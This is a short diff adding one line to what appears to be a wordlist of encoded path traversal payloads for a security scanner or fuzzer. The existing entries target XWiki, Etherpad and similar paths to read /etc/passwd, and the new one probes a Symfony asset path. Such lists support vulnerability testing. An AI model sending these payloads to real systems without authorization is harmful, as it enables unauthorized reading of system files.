@@ -8,3 +8,4 @@
 /xwiki/bin/skin/..%252f/..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd
 /bin/skin/..%252f/..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd
 /static/plugins/ep_etherpad-lite/static/..%5C..%5C..%5C..%5C..%5C..%5C..%5Cetc/passwd
+/assets/images/%2e%2e/%2e%2e/vendor/symfony/error-handler/Resources/assets/images/symfony-logo.svg
